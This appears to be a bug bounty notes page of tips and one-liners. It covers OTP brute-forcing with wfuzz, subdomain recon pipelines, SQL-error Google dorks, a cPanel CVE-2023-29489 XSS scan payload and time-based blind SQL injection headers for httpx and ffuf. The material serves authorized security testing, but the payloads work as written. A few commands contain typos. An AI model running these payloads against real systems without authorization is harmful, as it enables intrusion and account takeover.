---
title: "Bug Bounty Tips"
description: ""
lead: ""
draft: false
images: []
weight: 60
markmap:
colorFreezeLevel: 2
---

<br>

# 🪲 Bug Bounty Tips, Tricks and Tools
---

<br><br>

## Brute Force OTP (One Time Password)

This command automates the process of sending multiple requests to the target URL, systematically replacing the otp field with different values from a wordlist. By analyzing the server's responses, this approach helps to identify potential weaknesses or vulnerabilities in the target application's handling of OTP (One-Time Password) verification.

    wfuzz -d '{"email":"email@email.com", "otp":"FUZZ","password":"P@ssw0rd123"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://example.com/identity/api/auth/v2/check-otp --hc 500


<br><br>

---

## Subdomain Enumeration and Filtering 

Subdomain enumeration is a common technique used in bug bounty programs and among web pentesters to identify potential vulnerabilities and attack surfaces. However, this process can often lead to a large number of subdomains, making it difficult to efficiently analyze all of them. It is also crucial to stay within the scope of the program and to avoid domains that are out of scope. Therefore, it is necessary to apply filtering techniques to ensure that only the relevant subdomains are analyzed and for saving time and effort.

The following examples may require modification based on the specific requirements of your task or the rules and limitations of the bounty program in use.

Requirements:
- assetfinder
- httprobe
- meg 
- html-tool
- gf

Steps:
1. Use a list of root domains to perform a quick subdomain scan, which are then outputted to a file named domains:
    
    `cat wildcards | assetfinder --subs-only > domains`

2. Remove any lines that contain the pattern `*.` which is commonly used to denote wildcard subdomains:

    `sed -i '/\s*\*\.\s*/d' domains`

3. Remove lines containing out of scope hosts, for example, my.example.com, by using word boundaries (\b) to ensure that the pattern only matches as a separate word:

    `sed -i '/\bmy\.example\.com\b/d' domains`

4. Extract only domain names that have exactly two dots and three components separated by dots, which helps to ensure that you are only targeting the domains inside the scope:

    `grep -E '^([^.]+\.[^.]+\.[^.]+)$' domains > filtered_domains`

5. Extract and save the domains that end with either .com or .tech (for example), which matches the scope of the research:

    `grep -E '([^.]+\.[^.]+\.com$)|([^.]+\.[^.]+\.tech$)' filtered_domains > final_domains`

6. Remove lines that do not belong to the scope:

    `sed -i '/com--foo/d' final_domains`

7. Test whether each domain is accessible via HTTP or HTTPS and save the results to a file named hosts:

    `cat final_domains | httprobe | tee hosts`

8. Use meg to send simple GET requests to the hosts list and save the response headers to files stored in the 'out' folder. The -d flag sets the delay between requests, which can be useful for avoiding rate limiting or other issues:

    `meg -d 1000 --header -v /`

9. Find base64-encoded strings, extract the third field (the actual strings) and remove the first character in each line to get more clear output.

    `gf base64 | awk -F':' '{print $3}' | cut -c2-`

10. Locate all the files in the current directory and its subdirectories, and then pipe the output to the html-tool command to extract the src attribute from any HTML tags found in those files:

    `find . -type f | html-tool attribs src`

11. Find title tags:

    `find . -type f | html-tool tags title`

12. Find unique titles:

    `find . -type f | html-tool tags title | sort -u`

13. Take a unique title and use grep to see where it came from.

    `find . -type f | html-tool tags title | sort -u | grep -HR 'ERROR: The request could not be satisfied'`


 gf urls | sort -u | unfurl -u paths


**-- Resources: Tomnomnom, STÖK, ChatGPT**  

<br><br>

<iframe width="560" height="315" src="https://www.youtube.com/embed/l8iXMgk2nnY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>


  

<br><br>

---

## Bypass WAF / Restrictions with REcollapse


This tool assists in blackbox regex fuzzing to bypass validations and discover normalizations in web apps.

Repo: [https://github.com/0xacb/recollapse](https://github.com/0xacb/recollapse)

    recollapse -e 1 -p 1,2,4 -r 10-11 https: //legit.example.com

Creator: @0xacb - (Also thanks to HackerOne )

<br><br>

---

## DorkGenius

AI tool that generates "dorks" to find vulnerable sites and sensitive information for Google, Bing and DuckDuckGo based on their descriptions.

[https://dorkgenius.com](https://dorkgenius.com)

<br><br>

---

## Easy Sqli via google dork Tip

1. using SQL errors Dork:
`site:target.com intext:"sql syntax near" | intext:"incorrect syntax near"`


2. `indexed page with sql error`


3. `Confirmed with "waitfor delay'0:0:15'--"`


SQL dork :

`site:target.com intext:"sql syntax near" |
intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"`

by @Ahmed M Hassan

<br><br>

---

## 𝙘𝙋𝙖𝙣𝙚𝙡 CVE-2023-29489 𝙓𝙎𝙎 𝙊𝙣𝙚-𝙇𝙞𝙣𝙚𝙧

`subfinder -d example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400`

Follow [Cybertix](https://cybertix.in/?__cf_chl_tk=1KWgKjkI6OiHA2dcNMwVfx.YDxTfAjkr1p0i4Qii7Mo-1683559897-0-gaNycGzNCtA) for Bug Bounty Tips & Tricks 💲💲

<br><br>

---

## Find Header-Based Blind SQL Injection 💉
<br>

**httpx**

`cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'`

**ffuf**

`ffuf -w domains.txt -u FUZZ -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z`

To avoid false positive, I use this command:

`ffuf -w domains.txt -u FUZZ -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z" -c 200 -o json --timeout 6`

For wordlist and multiple Headers:

`ffuf -w headers.txt -u <target> -H "User-Agent: FUZZ" -c 200 -o json`

Credit:- [Ibrahim H.](https://www.linkedin.com/in/ACoAABoMQ5EBdbSWu5zfUwRiXDgS-aoqpyIpI3k/) 

<br><br>

---

<br><br>

## Find sitemap. xml endpoint

`subfinder -d openai.com -silent -all I httpx -silent -path "/sitemap. xml? offset=1" -mc 200 - follow-redirects`

@ReconOne

<br><br>

---

## Poseidon Web Scanner Vulnerability 1.0

It is a nuclei-based Python vulnerability scanner.
Currently uses the following features:

- Import YAML files to generate the vulnerability response match
- Import a TXT where the parameters to fuzz are found
- Allows importing multiple urls for vulnerability scanning
- Currently you can add the number of threads
- Allows authenticated scanning through cookies.
- It supports TLS in all its versions.

Create your own templates in YAML and have fun with this tool with few lines of code!
Link tool: [https://github.com/HernanRodriguez1/Poseidon-Web-Scanner-Vulnerability/](https://github.com/HernanRodriguez1/Poseidon-Web-Scanner-Vulnerability/)

Compatible: Linux / Windows